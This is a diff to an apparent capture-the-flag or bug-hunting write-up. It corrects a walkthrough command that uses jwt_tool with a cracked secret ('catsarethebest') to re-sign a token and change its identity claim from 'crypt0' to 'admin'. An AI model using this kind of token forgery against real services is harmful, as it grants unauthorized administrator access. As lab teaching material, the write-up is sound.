@@ -29,6 +29,7 @@ All order IDs are processed using the WebSocket protocol, not the Post method.
 
 ![bug_repo_4](https://user-images.githubusercontent.com/105972068/285249312-6d14414d-8d1d-402c-b17c-dedb1978ab35.png)
 
+
 ### Walkthrough
 
 > I discovered this command for the injection. 
@@ -70,7 +71,7 @@ py jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZGVudGl0eSI6ImNyeXB0MCJ9
 
 > Modify this JWT from crpt0 to admin
 ```
-eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZGVudGl0eSI6ImNyeXB0MCJ9.zbwLInZCdG8Le5iH1fb5GHB5OM4bYOm8d5gZ2AbEu_I -S hs256 -p catsarethebest -pv admin -I -pc identity
+py jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZGVudGl0eSI6ImNyeXB0MCJ9.zbwLInZCdG8Le5iH1fb5GHB5OM4bYOm8d5gZ2AbEu_I -S hs256 -p catsarethebest -pv admin -I -pc identity
 ```
 
 *We get admin JWT:*
